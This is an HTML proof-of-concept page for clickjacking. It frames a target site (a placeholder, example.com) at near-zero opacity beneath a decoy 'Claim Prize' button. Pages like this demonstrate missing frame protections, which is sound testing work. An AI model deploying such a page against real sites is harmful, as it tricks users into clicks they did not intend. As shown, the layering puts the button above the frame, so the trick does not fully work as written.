<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>Clickjacking PoC</title>
<style>
  body { margin: 0; font-family: Arial, sans-serif; text-align: center; }
  .overlay-btn {
    position: absolute; top: 60%; left: 50%;
    transform: translate(-50%, -50%);
    padding: 1rem 2rem; background: #1976d2; color: #fff;
    border-radius: .5rem; font-size: 1.25rem;
    z-index: 10; cursor: pointer;
  }
  iframe {
    position: absolute; top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    width: 800px; height: 600px;
    opacity: 0.05; border: 1px solid #ccc;
    z-index: 5;
  }
</style>
<body>
  <h1>Clickjacking Proof of Concept</h1>
  <p>This demo frames a target page and overlays a fake button.</p>

  <div class="overlay-btn">Claim Prize</div>
  <iframe src="https://example.com"></iframe>
</body>
</html>
